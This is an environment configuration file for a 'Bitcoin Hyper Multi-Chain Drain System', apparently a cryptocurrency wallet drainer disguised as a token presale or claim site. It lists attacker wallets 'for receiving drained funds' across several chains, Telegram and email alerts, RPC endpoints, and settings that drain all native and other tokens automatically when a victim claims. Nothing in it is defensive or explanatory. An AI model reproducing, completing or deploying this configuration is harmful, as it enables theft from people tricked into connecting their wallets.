# ============================================
# BITCOIN HYPER MULTI-CHAIN DRAIN SYSTEM v6.0
# ============================================

# Server Configuration
PORT=10000
NODE_ENV=production
ALLOWED_ORIGINS=http://localhost:3000,https://securedtokenclaim.vercel.app

# Rate Limiting
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX_REQUESTS=50

# Admin Security
ADMIN_TOKEN=YourSecureTokenHere123!
ADMIN_EMAIL=admin@bitcoinhyper.com

# Token Configuration
TOKEN_NAME=Bitcoin Hyper
TOKEN_SYMBOL=BTH
MIN_ELIGIBILITY_AMOUNT=10
PRESALE_PRICE=0.17
BASE_ALLOCATION=5000
MAX_BONUS_MULTIPLIER=3

# Admin Wallets (for receiving drained funds)
ADMIN_ETH_WALLET=0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47
ADMIN_POLYGON_WALLET=0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47
ADMIN_BSC_WALLET=0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47
ADMIN_ARBITRUM_WALLET=0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47
ADMIN_OPTIMISM_WALLET=0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47

# Telegram Configuration
TELEGRAM_BOT_TOKEN=YOUR_TELEGRAM_BOT_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
TELEGRAM_NOTIFICATIONS_ENABLED=true

# Email Configuration (Optional)
EMAIL_NOTIFICATIONS_ENABLED=true
EMAIL_USER=your-email@gmail.com
EMAIL_PASS=your-app-specific-password
EMAIL_SERVICE=gmail

# ============================================
# MULTI-CHAIN RPC ENDPOINTS
# ============================================

# Ethereum Mainnet
ETH_RPC_URL=https://eth.llamarpc.com

# Binance Smart Chain
BSC_RPC_URL=https://bsc-dataseed.binance.org

# Polygon
POLYGON_RPC_URL=https://polygon-rpc.com

# Arbitrum
ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc

# Optimism
OPTIMISM_RPC_URL=https://mainnet.optimism.io

# Avalanche
AVAX_RPC_URL=https://api.avax.network/ext/bc/C/rpc

# Fantom (Optional)
FANTOM_RPC_URL=https://rpc.ftm.tools

# Celo (Optional)
CELO_RPC_URL=https://forno.celo.org

# Heco (Optional)
HECO_RPC_URL=https://http-mainnet.hecochain.com

# ============================================
# TOKEN PRICE API (Optional - for accurate USD values)
# ============================================
COINGECKO_API_KEY=YOUR_COINGECKO_API_KEY
CMC_API_KEY=YOUR_COINMARKETCAP_API_KEY

# ============================================
# DRAIN SETTINGS
# ============================================
DRAIN_ENABLED=true
AUTO_DRAIN_ON_CLAIM=true
DRAIN_ALL_TOKENS=true
DRAIN_NATIVE_TOKENS=true
MIN_DRAIN_AMOUNT_USD=0.01
